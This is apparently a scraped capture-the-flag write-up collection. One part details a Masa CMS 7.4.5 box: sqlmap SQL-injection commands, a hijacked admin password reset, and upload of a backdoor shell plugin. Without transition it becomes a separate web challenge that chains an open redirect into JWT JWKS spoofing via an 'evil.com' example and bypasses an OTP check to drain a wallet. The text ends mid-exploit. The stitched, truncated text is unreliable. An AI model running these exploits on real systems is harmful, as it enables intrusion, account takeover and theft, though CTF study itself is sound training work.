[{"content":"Fullpwn - Freedom In these challenging times, the voices of freedom are growing fainter. Help us identify potential vulnerabilities in our systems so we can safeguard them against the Frontier Board, which seeks to silence any dissenting opinions. Allow up to 3 minutes for all the services to properly boot.\nUser Enumeration starting with port canning, we found that the machine are running Windows due to kerberos port (88) opened.\nWeb Application I started to enumerate web apps, which redirected into /index.cfm. cfm file extension are used for ColdFusion. there\u0026rsquo;s nothing much in the landing page, which then i decided to perform directory scan. Here i found several interesting results such as /README.md and /admin In the README.md files, i found that web application running Masa CMS if we try to open the /admin path, then we can also confirm that Masa CMS is being used. continuing with the directory scan, i found other interesting files named box.json. It seems like version 7.4.5 or Masa CMS is being used right now.\nMasaCMS Exploit After searching for known exploit of Masa CMS, i found this interesting article by projectdiscovery which disclose about pre-auth sql injection in Masa CMS version 7.4.5. Perfect!\nThey also provide attack scenario to obtain RCE in the Masa CMS as well. Based on the article, it seems like the Masa CMS are vulnerable to error-based SQL Injection. So i use sqlmap to dump the database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;%5c\u0026#39;\u0026#34; --batch Alternatively, we can also view the database schema in the source code.\nIn order to achieve RCE, we need to reset user password. I use following command to dump user lists from database.\n1 sqlmap \u0026#34;http://freedom.htb/index.cfm/_api/json/v1/default/?method=processAsyncObject\u0026amp;object=displayregion\u0026amp;contenthistid=x\u0026amp;previewID=x\u0026#34; -p contenthistid --level 5 --risk 3 --technique=E --prefix=\u0026#34;x%5c\u0026#39;\u0026#34; --batch --dump -D dbMasaCMS -T tusers it seems like admin email was admin@freedom.htb\nusing the email address, we can invoke password reset from the /admin endpoint.\nAfter that, we need to obtain reset token and user id from database. We didn\u0026rsquo;t know where exactly the value is, and try to dump all table in dbMasaCMS database instead.\nAfter waiting for a while, we found interesting output within tredirects table.\nThe url can be used to reset admin password, nice!\nCrafting MuraCMS Plugin in order to obtain code execution, we need to upload our own plugin. This can be performed under Plugins \u0026gt; Add Plugin menu. I was lazy to create the plugin from scratch, so i decided to search for public available plugin, which i found from the MasaCMS repository itself\nI replace the content of MasaGoogleSitemaps-main\\admin\\views\\main\\default.cfm using backdoor shell from laudanum.\nThen i zip the plugin content and uploaded it. However, it shows error like this.\nFortunately, this error can be ignored. I just need to back to previous page and click for update button.\nVoila, plugin is uploaded! To access the plugin, click on it\u0026rsquo;s name This will redirect into /plugins/MasaGoogleSitemaps/ with forbidden result, what?? Luckily, we can remove the restriction by appending /index.cfm to the site. Shell is now opened, however we can\u0026rsquo;t see the content due to access restriction in the shell itself. We need to set X-Auth-Code header with value taken from the source code. Shell can be accessed now WSL Escape? When i execute whoami, it returning root instead of windows user?? I easily guess that this is probably wsl. Using mount command, i found that this is indeed an wsl intances that mounting drive C:\\ from windows. We can access windows file\u0026rsquo;s from it.

In other word, we need to drain the wallet of the user.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import { getBalancesForUser } from \u0026#39;../services/coinService.js\u0026#39;; import fs from \u0026#39;fs/promises\u0026#39;; const FINANCIAL_CONTROLLER_EMAIL = \u0026#34;financial-controller@frontier-board.htb\u0026#34;; /** * Checks if the financial controller\u0026#39;s CLCR wallet is drained * If drained, returns the flag. */ export const checkFinancialControllerDrained = async () =\u0026gt; { const balances = await getBalancesForUser(FINANCIAL_CONTROLLER_EMAIL); const clcrBalance = balances.find((coin) =\u0026gt; coin.symbol === \u0026#39;CLCR\u0026#39;); if (!clcrBalance || clcrBalance.availableBalance \u0026lt;= 0) { const flag = (await fs.readFile(\u0026#39;/flag.txt\u0026#39;, \u0026#39;utf-8\u0026#39;)).trim(); return { drained: true, flag }; } return { drained: false }; }; the checkFinancialControllerDrained method are called within dashboardRouter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import { checkFinancialControllerDrained } from \u0026#39;../services/flagService.js\u0026#39;; export default async function dashboardRouter(fastify) { fastify.get(\u0026#39;/\u0026#39;, async (req, reply) =\u0026gt; { if (!req.user) { reply.status(401).send({ error: \u0026#39;Unauthorized: User not authenticated\u0026#39; }); return; } const { email } = req.user; if (!email) { reply.status(400).send({ error: \u0026#39;Email not found in token\u0026#39; }); return; } const { drained, flag } = await checkFinancialControllerDrained(); if (drained) { reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39;, flag }); return; } reply.send({ message: \u0026#39;Welcome to the Dashboard!\u0026#39; }); }); } This function will called when user access /api/dashboard.\n1 securedRoutes.register(dashboardRouter, { prefix: \u0026#39;/api/dashboard\u0026#39; }); ok, so how can we drain admin wallet? let\u0026rsquo;s analyze more.\nOpen Redirection After reading the source code, i found open redirection bug due to missing checking of url parameter.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 export default async function analyticsRoutes(fastify) { fastify.get(\u0026#39;/redirect\u0026#39;, async (req, reply) =\u0026gt; { const { url, ref } = req.query; if (!url || !ref) { return reply.status(400).send({ error: \u0026#39;Missing URL or ref parameter\u0026#39; }); } // TODO: Should we restrict the URLs we redirect users to? try { await trackClick(ref, decodeURIComponent(url)); reply.header(\u0026#39;Location\u0026#39;, decodeURIComponent(url)).status(302).send(); } catch (error) { console.error(\u0026#39;[Analytics] Error during redirect:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to track analytics data.\u0026#39; }); } }); fastify.get(\u0026#39;/data\u0026#39;, async (req, reply) =\u0026gt; { const { start = 0, limit = 10 } = req.query; try { const analyticsData = await getAnalyticsData(parseInt(start), parseInt(limit)); reply.send(analyticsData); } catch (error) { console.error(\u0026#39;[Analytics] Error fetching data:\u0026#39;, error.message); reply.status(500).send({ error: \u0026#39;Failed to fetch analytics data.\u0026#39; }); } }); } this route are defined with\n1 fastify.register(analyticsRoutes, { prefix: \u0026#39;/api/analytics\u0026#39; }); so we can perform open redirection using following url /api/analytics/redirect?ref=a\u0026amp;url=redirected.com\nJWKS Spoofing The application uses RS256 algorithm. This mean that JWT token will be signed using Private Key and validated using Public Key.\nThere\u0026rsquo;s a weakness in the token validation mechanism that lead to JWKS Spoofing.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 export const verifyToken = async (token) =\u0026gt; { try { const decodedHeader = jwt.decode(token, { complete: true }); if (!decodedHeader || !decodedHeader.header) { throw new Error(\u0026#39;Invalid token: Missing header\u0026#39;); } const { kid, jku } = decodedHeader.header; if (!jku) { throw new Error(\u0026#39;Invalid token: Missing header jku\u0026#39;); } // TODO: is this secure enough? if (!jku.startsWith(\u0026#39;http://127.0.0.1:1337/\u0026#39;)) { throw new Error(\u0026#39;Invalid token: jku claim does not start with http://127.0.0.1:1337/\u0026#39;); } if (!kid) { throw new Error(\u0026#39;Invalid token: Missing header kid\u0026#39;); } if (kid !== KEY_ID) { return new Error(\u0026#39;Invalid token: kid does not match the expected key ID\u0026#39;); } let jwks; try { const response = await axios.get(jku); if (response.status !== 200) { throw new Error(`Failed to fetch JWKS: HTTP ${response.status}`); } jwks = response.data; } catch (error) { throw new Error(`Error fetching JWKS from jku: ${error.message}`); } if (!jwks || !Array.isArray(jwks.keys)) { throw new Error(\u0026#39;Invalid JWKS: Expected keys array\u0026#39;); } const jwk = jwks.keys.find((key) =\u0026gt; key.kid === kid); if (!jwk) { throw new Error(\u0026#39;Invalid token: kid not found in JWKS\u0026#39;); } if (jwk.alg !== \u0026#39;RS256\u0026#39;) { throw new Error(\u0026#39;Invalid key algorithm: Expected RS256\u0026#39;); } if (!jwk.n || !jwk.e) { throw new Error(\u0026#39;Invalid JWK: Missing modulus (n) or exponent (e)\u0026#39;); } const publicKey = jwkToPem(jwk); const decoded = jwt.verify(token, publicKey, { algorithms: [\u0026#39;RS256\u0026#39;] }); return decoded; } catch (error) { console.error(`Token verification failed: ${error.message}`); throw error; } }; it will try to decode jwt token, parse jku and check wether it starts with http://127.0.0.1:1337/. This approach is unsafe if open redirection is found in the application. Luckily, we already found open redirect vulnerability earlier.\nWe can use redirection to bypass the validation by using link such as http://127.0.0.1:1337/redirect?url=evil.com so it will fetch content from evil.com instead of 127.0.0.1. This way we can provide our own public key for token validation, while encrypting the token using our own private key.\nUsing this method, we can create arbitrary token and able to logged in as anyone in the site.\nOTP Bypass In order to perform transaction, application will try to perform several check\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 fastify.post( \u0026#39;/transaction\u0026#39;, { preHandler: [rateLimiterMiddleware(), otpMiddleware()] }, async (req, reply) =\u0026gt; { const { to, coin, amount } = req.body; const userId = req.user.email; try { if (!to || !coin || !amount) { return reply.status(400).send({ error: \u0026#34;Missing required fields\u0026#34; }); } const supportedCoins = await getSupportedCoins(); if (!supportedCoins.includes(coin.toUpperCase())) { return reply.status(400).send({ error: \u0026#34;Unsupported coin symbol.\u0026#34; }); } const parsedAmount = parseFloat(amount); if (isNaN(parsedAmount) || parsedAmount \u0026lt;= 0) { return reply.status(400).send({ error: \u0026#34;Amount must be a positive number.\u0026#34; }); } const userExists = await validateUserExists(to); if (!userExists) { return reply.status(404).send({ error: \u0026#34;Recipient user does not exist.\u0026#34; }); } if (userId === to) { return reply.status(400).send({ error: \u0026#34;Cannot perform transactions to yourself.\u0026#34; }); } const result = await transactionByEmail(to, userId, parseFloat(amount), coin.toUpperCase()); if (!result.success) { return reply.status(result.status).send({ error: result.error }); } reply.send(result); } catch (err) { console.error(\u0026#34;Transaction error:\u0026#34;, err); reply.status(err.status || 500).send({ error: err.error || \u0026#34;An unknown error occurred during the transaction.\u0026#34; }); } } ); It also uses two middleware before performing those checks.\nfrist one is rateLimiterMiddleware() which prevent bruteforce attemp by limiting only 5 request per minute.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import { hsetField, hgetField, expireKey } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const rateLimiterMiddleware = (limit = 5, windowInSeconds = 60) =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const redisKey = `rate-limit:${userId}`; let currentCount = await hgetField(redisKey, \u0026#39;count\u0026#39;); if (!currentCount) { currentCount = 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); await expireKey(redisKey, windowInSeconds); } else { currentCount = parseInt(currentCount, 10) + 1; await hsetField(redisKey, \u0026#39;count\u0026#39;, currentCount); } if (currentCount \u0026gt; limit) { reply.status(429).send({ error: \u0026#39;Too many requests. Please try again later.\u0026#39; }); return; } }; }; second is otpMiddleware() which will checks for user OTP in redis.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 import { hgetField } from \u0026#39;../utils/redisUtils.js\u0026#39;; export const otpMiddleware = () =\u0026gt; { return async (req, reply) =\u0026gt; { const userId = req.user.email; const { otp } = req.body; const redisKey = `otp:${userId}`; const validOtp = await hgetField(redisKey, \u0026#39;otp\u0026#39;); console.log(validOtp) if (!otp) { reply.status(401).send({ error: \u0026#39;OTP is missing.\u0026#39; }); return } if (!validOtp) { reply.status(401).send({ error: \u0026#39;OTP expired or invalid.\u0026#39; }); return; } // TODO: Is this secure enough? if (!otp.includes(validOtp)) { reply.status(401).send({ error: \u0026#39;Invalid OTP.\u0026#39; }); return; } }; }; the otp are generated in the server and not given to user. The OTP is being generated for every one minute. So bruteforcing OTP is impossible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 export const generateOtp = () =\u0026gt; { return Math.floor(1000 + Math.random() * 9000).toString(); }; export const setOtpForUser = async (userId) =\u0026gt; { const otp = generateOtp(); const ttl = 60; await setHash(`otp:${userId}`, { otp, expiresAt: Date.now() + ttl * 1000 }); return otp; }; export const rotateOtps = async () =\u0026gt; { try { const userKeys = await getKeysByPattern(\u0026#39;user:*\u0026#39;); const rotatePromises = userKeys.map(async (userKey) =\u0026gt; { const userId = userKey.split(\u0026#39;:\u0026#39;)[1]; await setOtpForUser(userId); }); await Promise.all(rotatePromises); } catch (error) { console.error(\u0026#39;Error during OTP rotation:\u0026#39;, error); } }; export const safelyRotateOtps = async () =\u0026gt; { if (isRotating) { console.warn(\u0026#39;Previous OTP rotation is still in progress.

Although input is not the same, but if the string is \u0026ldquo;included\u0026rdquo; in the full string, then it will return true.\nThis way, we can insert all possible combination of otp in single request, bypassing the validation.\nExploitation so here\u0026rsquo;s the full attack chain:\nBypass JWT to logged in as admin Bypass OTP to drain user balance Access the flag let\u0026rsquo;s register in the website first then login to the site We get valid JWT token in jwt localstorage. and we can also get sample of jwks.json value.\n1 2 3 4 5 6 7 8 9 10 11 12 { \u0026#34;keys\u0026#34;: [ { \u0026#34;kty\u0026#34;: \u0026#34;RSA\u0026#34;, \u0026#34;n\u0026#34;: \u0026#34;tgSoSdh8tbodjwpc4hBKBs_0nZG5Fktdnk6gx401f66G93ibpGthzCdaPpP4fABrImpjO3qg8roK7OKFoxj6DpYINgD1LxUqyaOO3Mm3ZoL_EgKKPzKgUmNZKwL-br6g9JvrlVNjAgG1xmL7csezJ3qaX2FJ21sihvHFa7EiGbydY4sOiEw8p24TfWAi8exaw2DaYeEyj-CoCzhxSzahZR5H9Rc5NnCkhVrK1TIaZAOCFAVs0WAC4BTxPS9MJjgPTEbec97VozzXXOu3c4qIrB0GYM8-gtzEWwqKHLi4uDoSwzeevjbzfbwOE0F_LOFHb7piQBH2dJ78y8rPtIXhYQ\u0026#34;, \u0026#34;e\u0026#34;: \u0026#34;AQAB\u0026#34;, \u0026#34;alg\u0026#34;: \u0026#34;RS256\u0026#34;, \u0026#34;use\u0026#34;: \u0026#34;sig\u0026#34;, \u0026#34;kid\u0026#34;: \u0026#34;8ff20cff-f538-4af6-97b8-fecd36505989\u0026#34; } ] } now let\u0026rsquo;s create pairs of public \u0026amp; private key.
